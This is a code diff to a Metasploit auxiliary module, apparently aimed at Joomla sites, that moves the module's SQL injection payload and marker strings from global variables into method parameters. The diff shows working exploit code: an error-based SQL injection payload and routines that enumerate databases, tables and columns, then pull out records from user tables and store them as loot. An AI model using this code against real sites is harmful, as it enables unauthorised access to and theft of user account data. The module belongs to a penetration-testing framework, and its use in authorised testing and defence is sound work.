@@ -60,29 +60,29 @@ class Metasploit4 < Msf::Auxiliary
 
   end
 
-  def request(query)
-    query = "#{$payload}" % query
+  def request(query, payload, lmark, rmark)
+    query = "#{payload}" % query
     res = sqli(query)
 
     # Error based SQL Injection
-    if res && res.code == 500 && res.body =~ /#{$lmark}(.*)#{$rmark}/
+    if res && res.code == 500 && res.body =~ /#{lmark}(.*)#{rmark}/
       $1
     end
   end
 
-  def query_databases
+  def query_databases(payload, lmark, rmark)
     dbs = []
 
     query = '(SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) '
     query << 'FROM INFORMATION_SCHEMA.SCHEMATA)'
 
-    dbc = request(query)
+    dbc = request(query, payload, lmark, rmark)
 
     query_fmt = '(SELECT MID((IFNULL(CAST(schema_name AS CHAR),0x20)),1,54) '
     query_fmt << 'FROM INFORMATION_SCHEMA.SCHEMATA LIMIT %d,1)'
 
     0.upto(dbc.to_i - 1) do |i|
-      dbname = request(query_fmt % i)
+      dbname = request(query_fmt % i, payload, lmark, rmark)
       dbs << dbname
       vprint_good(dbname)
     end
@@ -93,14 +93,14 @@ class Metasploit4 < Msf::Auxiliary
     dbs
   end
 
-  def query_tables(database)
+  def query_tables(database, payload, lmark, rmark)
     tbs = []
 
     query = '(SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) '
     query << 'FROM INFORMATION_SCHEMA.TABLES '
     query << "WHERE table_schema IN (0x#{database.unpack('H*')[0]}))"
 
-    tbc = request(query)
+    tbc = request(query, payload, lmark, rmark)
 
     query_fmt = '(SELECT MID((IFNULL(CAST(table_name AS CHAR),0x20)),1,54) '
     query_fmt << 'FROM INFORMATION_SCHEMA.TABLES '
@@ -109,18 +109,18 @@ class Metasploit4 < Msf::Auxiliary
 
     vprint_status('tables in database: %s' % database)
     0.upto(tbc.to_i - 1) do |i|
-      tbname = request(query_fmt % i)
+      tbname = request(query_fmt % i, payload, lmark, rmark)
       vprint_good(tbname)
       tbs << tbname if tbname =~ /_users$/
     end
     tbs
   end
 
-  def query_columns(database, table)
+  def query_columns(database, table, payload, lmark, rmark)
     cols = []
     query = "(SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM #{database}.#{table})"
 
-    colc = request(query)
+    colc = request(query, payload, lmark, rmark)
     vprint_status(colc)
 
     valid_cols = [   # joomla_users
@@ -151,7 +151,7 @@ class Metasploit4 < Msf::Auxiliary
         l = 1
         record[col] = ''
         loop do
-          value = request(query_fmt % [col, l, i])
+          value = request(query_fmt % [col, l, i], payload, lmark, rmark)
           break if value.blank?
           record[col] << value
           l += 54
@@ -164,21 +164,21 @@ class Metasploit4 < Msf::Auxiliary
   end
 
   def run
-    $lmark = Rex::Text.rand_text_alpha(5)
-    $rmark = Rex::Text.rand_text_alpha(5)
+    lmark = Rex::Text.rand_text_alpha(5)
+    rmark = Rex::Text.rand_text_alpha(5)
 
-    $payload = 'AND (SELECT 6062 FROM(SELECT COUNT(*),CONCAT('
-    $payload << "0x#{$lmark.unpack('H*')[0]},"
-    $payload << '%s,'
-    $payload << "0x#{$rmark.unpack('H*')[0]},"
-    $payload << 'FLOOR(RAND(0)*2)'
-    $payload << ')x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)'
+    payload = 'AND (SELECT 6062 FROM(SELECT COUNT(*),CONCAT('
+    payload << "0x#{lmark.unpack('H*')[0]},"
+    payload << '%s,'
+    payload << "0x#{rmark.unpack('H*')[0]},"
+    payload << 'FLOOR(RAND(0)*2)'
+    payload << ')x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)'
 
-    dbs = query_databases
+    dbs = query_databases(payload, lmark, rmark)
     dbs.each do |db|
-      tables = query_tables(db)
+      tables = query_tables(db, payload, lmark, rmark)
       tables.each do |table|
-        cols = query_columns(db, table)
+        cols = query_columns(db, table, payload, lmark, rmark)
         next if cols.blank?
         path = store_loot(
           'joomla.users',
